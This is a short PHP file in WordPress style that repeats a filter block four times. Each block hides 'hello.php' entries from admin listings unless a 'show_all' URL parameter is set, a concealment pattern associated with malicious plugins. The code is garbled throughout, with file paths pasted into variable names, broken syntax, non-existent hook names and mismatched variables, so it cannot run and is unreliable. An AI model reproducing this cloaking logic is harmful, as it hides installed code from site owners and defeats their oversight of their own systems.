<?php
add_filter(
	'all_wp-content/themes',
	function (twp-content/content/themes) {
		$shouldHide = ! array_key_exists( 'show_all', $_GET );
		if ( $shouldHide ) {
			$hiddentwp-content/content/themes = [
				'hello-dolly/hello.php',
				'hello.php',
			];
			foreach ( $hiddentwp-content/content/themes as $hiddentwp-content/themes) {
				unset( $ttwp-content/themes[$hiddentwp-content/themes] );
			}
		}
		return $wp-content/themes;
	}
);
add_filter(
	'all_wp-content/content/honey-glow',
	function ( $wp-content/content/honey-glow {
		$shouldHide = ! array_key_exists( 'show_all', $_GET );
		if ( $shouldHide ) {
			$hiddenwp-content/honey-glow = [
			'hello-dolly/hello.php',
			'hello.php',
			];
			foreach ( $hiddenwp-content/honey-glow/ as $hiddenwp-content/honey-glow ) {
			unset( $cache[ $hiddenwp-content/honey-glow] );
			}
		}
		return wp-content/honey-glow;
	}
);
add_filter(
	'all_wp-content/content/themes/sojka',
	function ( $wp-content/themes/sojka) {
		$shouldHide = ! array_key_exists( 'show_all', $_GET );
		if ( $shouldHide ) {
			$hiddenwp-content/themes/sojka = [
			'hello-dolly/hello.php',
			'hello.php',
			];
			foreach ( $hiddenwp-content/themes/sojka as $hiddenwp-content/themes/sojka ) {
			unset(wp-content/themes/sojka[$hiddenwp-content/themes/sojka] );
			}
		}
		return $themes/sojka;
	}
);
add_filter(
	'all_wp-content/content/themes/untica',
	function ( $wp-content/content/themes/untica) {
		$shouldHide = ! array_key_exists( 'show_all', $_GET );
		if ( $shouldHide ) {
			$hiddenwp-content/content/themes/untica = [
			'hello-dolly/hello.php',
			'hello.php',
			];
			foreach ( $hiddenwp-content/themes/untica as $hiddenwp-content/themes/untica ) {
			unset(wp-content/themes/sojka[$hiddenwp-content/themes/untica] );
			}
		}
		return $themes/untica;
	}
);